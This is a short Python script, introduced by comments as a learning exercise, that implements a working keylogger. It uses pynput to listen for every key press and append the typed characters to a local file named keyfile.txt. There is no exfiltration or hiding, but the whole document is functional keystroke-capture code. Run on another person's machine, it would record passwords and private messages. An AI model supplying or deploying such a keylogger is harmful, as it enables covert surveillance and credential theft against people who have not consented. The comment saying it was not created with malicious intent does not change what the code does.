# this is only to learn how keyloggers work. This was not created with malicious intent.
# this outputs the keys to a seperate file. This does not send the data to any other bad actors.

from pynput import keyboard

def keyPressed(key):
    print(str(key)) # converts to a string so it can be saved to file later
    with open("keyfile.txt", 'a') as logkey: #opens the file so keys can be noted down
        try: # just in case the key cannot be found
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__": #this runs the main method
    listener = keyboard.Listener(on_press=keyPressed) # anytime a key is pressed, it saves the event in a variable
    listener.start() # starts capturing the key events
    input() # grabs the user's input